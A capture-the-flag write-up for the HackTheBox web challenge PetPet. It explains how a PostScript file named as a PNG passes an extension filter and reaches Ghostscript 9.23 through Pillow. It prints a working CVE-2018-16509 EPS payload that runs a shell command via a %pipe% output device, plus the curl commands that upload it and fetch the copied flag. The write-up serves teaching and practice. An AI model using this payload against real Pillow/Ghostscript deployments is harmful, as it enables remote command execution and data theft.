---
layout: post
title: "PetPet (HTB web)"
subtitle: "an EPS payload named as a PNG reaches Ghostscript 9.23 through Pillow and runs a shell command (CVE-2018-16509)"
date: 2023-04-16
tags: [htb, web, file-upload, ghostscript, cve-2018-16509, pillow]
category: writeups
kind: challenge
os: Linux
tldr: "The PetPet GIF maker validates only the trailing extension with rsplit('.',1), so a file named .png passes the check while Pillow still picks the format from the bytes. I uploaded a PostScript file that Pillow handed to Ghostscript 9.23, which runs a piped shell command through the /OutputFile device (CVE-2018-16509). The payload copied /app/flag into the web-served petpets directory and I read it over HTTP."
---

## the app

PetPet is a small Flask app that turns an uploaded image into a petting GIF. It registers two blueprints, the web UI at `/` and an API at `/api`. The only input I controlled was the upload endpoint:

```python
@api.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return {'status': 'failed', 'message': 'No file provided'}, 400

    file = request.files['file']

    if not file or not file.filename:
        return {'status': 'failed', 'message': 'Something went wrong with the file'}, 400

    return petpet(file)
```

The front-end posts the chosen file to `/api/upload` under the form field `file`:

```javascript
let formData = new FormData();
formData.append('file', image);

axios.post('/api/upload', formData, { ... })
```

On success the server converts the upload into an animated GIF, drops it under the static directory, and returns the path. The flag sits at `/app/flag`, so a plain upload-and-convert feature was the whole attack surface.

## the upload filter

The extension check is the first gate `petpet()` runs:

```python
ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])

def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

`rsplit('.', 1)[1]` takes the part after the last dot, so the filter only asks whether the name ends in one of the allowed extensions. I checked both orderings in a shell:

```python
filename = "file.png.php"
print(filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS)   # False

filename = "file.php.png"
print(filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS)   # True
```

A double extension like `file.php.png` passes. On its own that buys nothing here. The file is run through `secure_filename`, saved into the system temp dir, and unlinked after processing, and there is no handler that would ever execute a `.php` component:

```python
def save_tmp(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, secure_filename(file.filename))
    file.save(path)
    return path
```

The only thing the filter constrains is the trailing extension of my filename. What it does not constrain is the format Pillow decides the file actually is, and Pillow reads that from the content. That disagreement is the bug.

## the real bug

`petpet()` opens the upload with Pillow and converts it:

```python
def petpet(file):

    if not allowed_file(file.filename):
        return {'status': 'failed', 'message': 'Improper filename'}, 400

    try:
        tmp_path = save_tmp(file)

        bee = Image.open(tmp_path).convert('RGBA')
        frames = [Image.open(f) for f in sorted(glob.glob('application/static/img/*'))]
        finalpet = petmotion(bee, frames)

        filename = f'{generate(14)}.gif'
        finalpet[0].save(
            f'{main.app.config["UPLOAD_FOLDER"]}/{filename}',
            save_all=True, duration=30, loop=0, append_images=finalpet[1:],
        )

        os.unlink(tmp_path)
        return {'status': 'success', 'image': f'static/petpets/{filename}'}, 200

    except:
        return {'status': 'failed', 'message': 'Something went wrong'}, 500
```

`Image.open` identifies the format from the file header, not from the name. When the content is PostScript, the conversion path rasterizes it by shelling out to the `gs` binary, and the Dockerfile pins that binary to a specific build:

```dockerfile
RUN curl -L -O https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23-linux-x86_64.tgz \
    && tar -xzf ghostscript-9.23-linux-x86_64.tgz \
    && mv ghostscript-9.23-linux-x86_64/gs-923-linux-x86_64 /usr/local/bin/gs && rm -rf /tmp/ghost*
```

Ghostscript 9.23 predates the fix for CVE-2018-16509, the `-dSAFER` sandbox bypass that lets a crafted PostScript document reach the pipe output device and run a shell command. So a PostScript payload named `whatever.png` passes `allowed_file` on its trailing extension, and Pillow still routes its bytes to the vulnerable `gs`.

## the payload

I built the EPS from farisv's [PIL-RCE-Ghostscript PoC](https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509) and saved it as `msf.png`:

```text
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cp /app/flag /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
```

The header makes it a valid EPS so Pillow accepts it and calls Ghostscript. The middle block is the SAFER bypass. Undefining `setpagedevice` and running the `save` / `restore` dance clears the restrictions that would normally block a device that writes to a file, so `putdeviceprops` goes through. The primitive is the last line: `%pipe%` in `/OutputFile` tells Ghostscript to open the output as a command pipe instead of a file, and everything after it is run by the shell. Here it copies `/app/flag` into the petpets directory, which Flask serves under `/static`.

## the solve

Target instance was `188.166.175.0:30530`. I posted the payload to the upload endpoint as the `file` field, with the `.png` name to clear the filter:

```bash
$ curl -s -F 'file=@msf.png' http://188.166.175.0:30530/api/upload
```

The conversion runs Ghostscript while it is still interpreting the PostScript, so the `cp` executes at parse time. It does not matter whether Pillow then manages to build a GIF: a success comes back as `{'status': 'success', 'image': 'static/petpets/<hex>.gif'}`, and a later exception is swallowed into `{'status': 'failed', 'message': 'Something went wrong'}`, but the flag has already been copied either way.

Then I just read the copied file straight off the static path the payload wrote to:

```bash
$ curl -s http://188.166.175.0:30530/static/petpets/flag.txt
```

## the flag

The GET returned the contents of `/app/flag`, which I submitted. The copy-to-static step sidesteps the need for a second-stage channel: the output device does the exfil for me, dropping the flag exactly where the web server will hand it back. The shipped Docker build carries a placeholder flag file, so to confirm the chain end to end I ran the same upload against my local container and watched `flag.txt` appear under `static/petpets/` before fetching it.

The whole chain is one mismatch: the filter trusts the filename's last extension, Pillow trusts the bytes, and the bytes are a PostScript document that an unpatched Ghostscript will happily pipe to `/bin/sh`.